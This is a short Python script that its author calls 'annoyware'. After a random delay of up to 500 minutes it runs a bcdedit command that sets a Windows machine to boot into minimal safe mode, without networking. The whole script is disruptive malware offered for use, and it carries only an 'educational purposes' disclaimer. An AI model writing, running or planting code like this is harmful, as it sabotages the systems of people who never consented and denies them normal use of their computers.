"""
DISCLAIMER: ***FOR EDUCATIONAL PURPOSES ONLY. I AM NOT RESPONSIBLE FOR ANY DAMAGES YOU MAY CAUSE WITH THIS.***


Author: Abhishek Iyengar
GitHub: https://github.com/tinshade
Description: This is a small python script that will randomly boot the windows machine into safemode.
While a safe-mode can have 3 vairants, this one uses the basic variant that does not allow for networking or CMD
operations.
I made this as an annoyware but it is fairly simple to remove once you are in the safe-mode. If you know what you're
doing, that is.
"""


import os
import time
import random

randomIllusion = random.randint(1,500) #Get a random breathing time
time.sleep(randomIllusion*60) #Waiting for the time in minutes
os.system('bcdedit /set {default} safeboot minimal') #Rebooting in safe mode